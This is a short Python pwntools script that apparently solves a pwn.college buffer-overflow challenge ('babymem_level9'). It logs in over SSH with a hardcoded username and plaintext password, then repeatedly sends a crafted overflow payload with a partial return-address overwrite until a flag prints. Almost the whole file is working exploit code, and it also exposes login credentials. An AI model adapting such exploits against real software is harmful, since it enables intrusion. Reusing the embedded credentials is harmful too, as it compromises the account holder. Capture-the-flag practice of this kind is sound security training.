from pwn import *

# e = ELF('./babymem_level9_testing1')
# libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")
while 1:
    p = s.run('/babymem_level9_testing1')

    pay = b'\x00'*0x1C + b'\x37' + 0x81A6.to_bytes(2, 'little')
    p.sendlineafter(b'size: ',str(0x3A))
    p.sendafter(b'!\n',pay)

    try:   
        p.recvuntil(b'pwn_')
        print('pwn_' + p.recvuntil(b'}').decode())
        break
    except KeyboardInterrupt:
        exit(1)
    except:
        pass